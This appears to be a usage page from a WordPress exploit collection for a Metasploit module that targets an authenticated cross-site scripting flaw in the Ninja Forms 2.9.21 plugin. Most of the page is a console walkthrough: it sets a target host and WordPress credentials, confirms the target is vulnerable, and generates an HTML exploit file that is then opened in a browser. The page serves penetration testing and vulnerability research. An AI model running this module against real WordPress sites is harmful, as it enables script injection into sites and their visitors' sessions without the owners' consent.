#### Add WordPress Plugin Ninja Forms XSS Vulnerability.

  Application: WordPress Plugin 'Ninja Forms' 2.9.21
  Homepage: https://wordpress.org/plugins/ninja-forms
  Source Code: https://downloads.wordpress.org/plugin/ninja-forms.2.9.21.zip
  References: https://wpvulndb.com/vulnerabilities/8128
  Active Install: +200.000

#### Vulnerable packages*
        
  2.9.21

#### Module

  [wp_ninja_forms_xss_scanner.rb](https://github.com/espreto/wpsploit/blob/master/modules/auxiliary/scanner/http/wordpress/wp_ninja_forms_xss_scanner.rb)
  
#### Usage:

##### Linux (Ubuntu 14.04.2 LTS):
```
msfdevel 10.10.10.10 shell[s]:0 job[s]:0 msf>  use auxiliary/scanner/http/wp_ninja_forms_xss_scanner 
msfdevel 10.10.10.10 shell[s]:0 job[s]:0 msf> auxiliary(wp_ninja_forms_xss_scanner)  show options 

Module options (auxiliary/scanner/http/wp_ninja_forms_xss_scanner):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target address range or CIDR identifier
   RPORT      80               yes       The target port
   TARGETURI  /                yes       The base path to the wordpress application
   THREADS    1                yes       The number of concurrent threads
   VHOST                       no        HTTP server virtual host
   WP_PASS                     yes       A valid password
   WP_USER                     yes       A valid username

msfdevel 10.10.10.10 shell[s]:0 job[s]:0 msf> auxiliary(wp_ninja_forms_xss_scanner)  info

       Name: WordPress Ninja Forms XSS Scanner
     Module: auxiliary/scanner/http/wp_ninja_forms_xss_scanner
    License: Metasploit Framework License (BSD)
       Rank: Normal
  Disclosed: 2015-07-14

Provided by:
  Morten Nørtoft, Kenneth Jepsen, Mikkel Vej
  Roberto Soares Espreto <robertoespreto@gmail.com>

Basic options:
  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOSTS                      yes       The target address range or CIDR identifier
  RPORT      80               yes       The target port
  TARGETURI  /                yes       The base path to the wordpress application
  THREADS    1                yes       The number of concurrent threads
  VHOST                       no        HTTP server virtual host
  WP_PASS                     yes       A valid password
  WP_USER                     yes       A valid username

Description:
  This module attempts to exploit an Authenticated Cross-Site 
  Scripting in Ninja Forms Plugin for Wordpress, version 2.9.21 and 
  likely prior in order if the instance is vulnerable.

References:
  https://wpvulndb.com/vulnerabilities/8128
  https://packetstormsecurity.com/files/132913/

msfdevel 10.10.10.10 shell[s]:0 job[s]:0 msf> auxiliary(wp_ninja_forms_xss_scanner)  set RHOSTS 10.10.10.20
RHOSTS => 10.10.10.20
msfdevel 10.10.10.10 shell[s]:0 job[s]:0 msf> auxiliary(wp_ninja_forms_xss_scanner)  set WP_USER espreto
WP_USER => espreto
msfdevel 10.10.10.10 shell[s]:0 job[s]:0 msf> auxiliary(wp_ninja_forms_xss_scanner)  set WP_PASS R@x0rP@55
WP_PASS => R@x0rP@55
msfdevel 10.10.10.10 shell[s]:0 job[s]:0 msf> auxiliary(wp_ninja_forms_xss_scanner)  check
[*] 10.10.10.20:80 - The target appears to be vulnerable.
[*] Checked 1 of 1 hosts (100% complete)
msfdevel 10.10.10.10 shell[s]:0 job[s]:0 msf> auxiliary(wp_ninja_forms_xss_scanner)  run

[+] 10.10.10.20:80 - Vulnerable to Cross-Site Scripting the Ninja Forms 2.9.21 plugin for Wordpress
[+] Save in: /home/espreto/.msf4/local/script.html
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msfdevel 10.10.10.10 shell[s]:0 job[s]:0 msf> auxiliary(wp_ninja_forms_xss_scanner)  firefox /home/espreto/.msf4/local/script.html
```
This will open the browser:

![XSS](../images/wp_ninja_forms_xss_scanner.png)
